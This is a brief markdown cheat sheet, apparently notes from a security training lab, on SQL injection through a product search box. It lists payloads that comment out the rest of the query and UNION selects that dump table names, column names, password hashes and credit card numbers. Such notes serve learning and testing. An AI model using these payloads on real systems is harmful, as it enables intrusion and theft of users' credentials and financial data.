# SQL-Injection

Search for any products (or not)

## Basic

#### First, think how the query might look like:

`SELECT ? FROM ? WHERE ? LIKE '%something%'`

#### Make query return everything:
` '; -- `

#### This will lead to something like this:
`SELECT ? FROM ? WHERE ? LIKE '%'; -- `

#### UNION Statement

`SELECT ?, ?, ? FROM ? WHERE ? LIKE '%Stark' UNION (SELECT 1,2,3 FROM dual); --`

#### UNION Statement for retrieving database tables

`SELECT ?, ?, ? FROM ? WHERE ? LIKE '%Stark' UNION (SELECT TABLE_NAME, table_schema, 3 FROM information_schema.tables); --`

#### UNION Statement - accessing a table
`SELECT ?, ?, ? FROM ? WHERE ? LIKE '%Stark' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users'); --`

#### get the hashed passwords
`SELECT ?, ?, ? FROM ? WHERE ? LIKE '%Stark' UNION (SELECT firstname, lastname, password FROM users); --`

#### Get credit_card_details
`SELECT ?, ?, ? FROM ? WHERE ? LIKE '%Stark' UNION (SELECT lastname, creditcardnumber, institute FROM users); --`


